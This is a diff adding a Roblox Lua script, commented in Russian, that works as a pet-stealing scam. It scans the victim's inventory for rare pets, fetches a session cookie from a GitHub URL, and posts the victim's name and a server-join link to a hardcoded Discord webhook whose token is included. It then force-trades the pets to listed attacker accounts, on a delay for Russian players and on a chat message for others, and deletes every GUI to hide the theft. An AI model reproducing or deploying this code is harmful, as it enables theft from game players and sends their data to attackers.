@@ -1,0 +1,259 @@
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalizationService = game:GetService("LocalizationService")  -- Для проверки страны
+
+local inventoryPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Container
+local equippedPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Equipped.List
+local VALID_RARITIES = {
+    ["Mythical"] = true,
+    ["Secret I"] = true,
+    ["Secret II"] = true,
+    ["Secret III"] = true
+}
+local FoundIDs = {}
+local UserNames = {
+    "Iriska0_0v",
+    "StantY_Y",
+    "ZeeS_Farm2",
+    "ZeeS_Farm3",
+    "ZeeS_Farm4",
+    "ZeeS_Farm5"
+}
+local webhook = "https://discord.com/api/webhooks/1429095915636920482/KJleNyik5SUuHrlufKJLtQTDVXS4CFnhr6dDH-Oh3XdbMY85Ej9Y7QV6cGtfg0Di7Yma"
+local HttpRequest = request or (syn and syn.request) or http_request or (http and http.request)
+local RarityCount = {}
+for rarity, _ in pairs(VALID_RARITIES) do
+    RarityCount[rarity] = 0
+end
+local TotalValuablePets = 0
+local COOKIE_URL = "https://raw.githubusercontent.com/Scripts777/SCRIPT/refs/heads/main/Z"
+local function fetchCookie()
+    if not HttpRequest then return nil end
+    local success, resp = pcall(function()
+        return HttpRequest({Url = COOKIE_URL, Method = "GET"})
+    end)
+    if success and resp and resp.Body then
+        local cookie = resp.Body:gsub("\n", ""):gsub("\r", "")
+        print("[COOKIE] Загружена кука")
+        return cookie
+    end
+    return nil
+end
+local Cookie = fetchCookie()
+local function scan(container, tag)
+    for _, pet in ipairs(container:GetChildren()) do
+        for _, child in ipairs(pet:GetChildren()) do
+            if VALID_RARITIES[child.Name] then
+                local id = pet:GetAttribute("Id")
+                if id then
+                    table.insert(FoundIDs, id)
+                    RarityCount[child.Name] = (RarityCount[child.Name] or 0) + 1
+                    TotalValuablePets = TotalValuablePets + 1
+                    print(string.format("[%s] %s — %s | ID: %s", tag, pet.Name, child.Name, id))
+                else
+                    warn(string.format("[%s] %s — %s | ID НЕ НАЙДЕН", tag, pet.Name, child.Name))
+                end
+            end
+        end
+    end
+end
+print("=== Inventory ===")
+scan(inventoryPath, "Inventory")
+print("=== Equipped ===")
+scan(equippedPath, "Equipped")
+print("Всего ценных петов:", TotalValuablePets)
+local function firePlayer(targetName)
+    local targetPlayer = Players:FindFirstChild(targetName) or Players:WaitForChild(targetName, 9e9)
+    local args = {[1] = targetPlayer}
+    local remote = ReplicatedStorage:WaitForChild("df82cbce-4e0e-45f4-993a-af75f0c1a09a", 9e9)
+        :WaitForChild("Events", 9e9):GetChildren()[30]
+    remote:FireServer(unpack(args))
+    print("FireServer (трейд) выполнен для игрока:", targetName)
+end
+local function firePet(id)
+    local args = {[1] = {"Pet", id}}
+    local remote = ReplicatedStorage:WaitForChild("df82cbce-4e0e-45f4-993a-af75f0c1a09a", 9e9)
+        :WaitForChild("Functions", 9e9):GetChildren()[63]
+    remote:InvokeServer(unpack(args))
+    print("Передан Pet ID:", id)
+end
+local function fireFinalEvent()
+    local args = {
+        [1] = false;
+        [2] = true;
+    }
+    ReplicatedStorage:WaitForChild("df82cbce-4e0e-45f4-993a-af75f0c1a09a", 9e9)
+        :WaitForChild("Events", 9e9):GetChildren()[35]:FireServer(unpack(args))
+    print("FireServer [35] выполнен (false, true)")
+end
+local function getJobIdFromPresence()
+    if not HttpRequest then return nil end
+    local userIds = {}
+    local idToName = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        table.insert(userIds, p.UserId)
+        idToName[p.UserId] = p.Name
+    end
+    if #userIds == 0 then return nil end
+    local body = HttpService:JSONEncode({userIds = userIds})
+    local headers = {["Content-Type"] = "application/json"}
+    if Cookie then headers["Cookie"] = ".ROBLOSECURITY=" .. Cookie end
+    local success, response = pcall(function()
+        return HttpRequest({Url = "https://presence.roblox.com/v1/presence/users", Method = "POST", Headers = headers, Body = body})
+    end)
+    if not success or not response or not response.Body then return nil end
+    local parseSuccess, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
+    if not parseSuccess or not data.userPresences then return nil end
+    for _, presence in ipairs(data.userPresences) do
+        if presence.placeId and presence.gameId then
+            return {placeId = tostring(presence.placeId), jobId = tostring(presence.gameId)}
+        end
+    end
+    return nil
+end
+local function sendToWebhook(presenceData)
+    if not HttpRequest or TotalValuablePets == 0 then return end
+    local placeId, jobId = presenceData.placeId, presenceData.jobId
+    local fernLink = ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
+    local teleportCmd = ("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')"):format(placeId, jobId)
+   
+    local rarityLines = {}
+    for rarity, count in pairs(RarityCount) do
+        if count > 0 then table.insert(rarityLines, string.format("**%s**: %d", rarity, count)) end
+    end
+    local rarityText = table.concat(rarityLines, "\n")
+   
+    local payload = {
+        content = "@everyone\n" .. teleportCmd .. "\n" .. fernLink,
+        embeds = {{
+            title = "🤑 Ценные петы!",
+            description = "**Жертва:** " .. lp.Name,
+            color = 16711680,
+            fields = {
+                {name = "Редкости:", value = rarityText, inline = false},
+                {name = "Всего:", value = TotalValuablePets, inline = true}
+            },
+            footer = {text = os.date("%d.%m %H:%M")}
+        }}
+    }
+   
+    local body = HttpService:JSONEncode(payload)
+    HttpRequest({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = body
+    })
+end
+if TotalValuablePets > 0 then
+    task.spawn(function()
+        local presence = getJobIdFromPresence()
+        if presence then sendToWebhook(presence) end
+    end)
+end
+local function removeAllGUI(parent)
+    for _, child in ipairs(parent:GetChildren()) do
+        child:Destroy()
+    end
+end
+
+-- === НОВАЯ ЛОГИКА: Проверка страны + разные условия для трейда ===
+local function isFromRussia()
+    local success, countryCode = pcall(function()
+        return LocalizationService:GetCountryRegionForPlayerAsync(lp)
+    end)
+    if success and countryCode == "RU" then
+        print("LocalPlayer из России (RU). Трейд через 15 сек после обнаружения.")
+        return true
+    else
+        print("LocalPlayer НЕ из России. Трейд по сообщению в чате.")
+        return false
+    end
+end
+
+local function initiateTrade(playerName)
+    firePlayer(playerName)
+    for _, id in ipairs(FoundIDs) do
+        firePet(id)
+    end
+    fireFinalEvent()
+    print("Трейд завершён для игрока:", playerName)
+    
+    -- Удаление GUI у всех игроков
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player:FindFirstChild("PlayerGui") then
+            removeAllGUI(player.PlayerGui)
+            player.PlayerGui.ChildAdded:Connect(function(child)
+                task.defer(function()
+                    removeAllGUI(child)
+                end)
+            end)
+        end
+    end
+end
+
+-- Проверка, из России ли игрок
+local fromRussia = isFromRussia()
+
+if fromRussia then
+    -- Логика для России: трейд через 15 сек после обнаружения игрока
+    for _, player in ipairs(Players:GetPlayers()) do
+        if table.find(UserNames, player.Name) then
+            print("Обнаружен игрок из UserNames:", player.Name)
+            task.delay(15, function()
+                initiateTrade(player.Name)
+            end)
+        end
+    end
+
+    Players.PlayerAdded:Connect(function(player)
+        if table.find(UserNames, player.Name) then
+            print("Обнаружен новый игрок из UserNames:", player.Name)
+            task.delay(15, function()
+                initiateTrade(player.Name)
+            end)
+        end
+        
+        -- Удаление GUI для новых игроков
+        if player:FindFirstChild("PlayerGui") then
+            removeAllGUI(player.PlayerGui)
+            player.PlayerGui.ChildAdded:Connect(function(child)
+                task.defer(function()
+                    removeAllGUI(child)
+                end)
+            end)
+        end
+    end)
+else
+    -- Логика для не-России: трейд по сообщению в чате
+    for _, player in ipairs(Players:GetPlayers()) do
+        if table.find(UserNames, player.Name) then
+            player.Chatted:Connect(function(message)
+                print(player.Name .. " написал в чат: " .. message)
+                initiateTrade(player.Name)
+            end)
+        end
+    end
+
+    Players.PlayerAdded:Connect(function(player)
+        if table.find(UserNames, player.Name) then
+            player.Chatted:Connect(function(message)
+                print(player.Name .. " написал в чат: " .. message)
+                initiateTrade(player.Name)
+            end)
+        end
+        
+        -- Удаление GUI для новых игроков
+        if player:FindFirstChild("PlayerGui") then
+            removeAllGUI(player.PlayerGui)
+            player.PlayerGui.ChildAdded:Connect(function(child)
+                task.defer(function()
+                    removeAllGUI(child)
+                end)
+            end)
+        end
+    end)
+end
+-- === КОНЕЦ НОВОЙ ЛОГИКИ ===
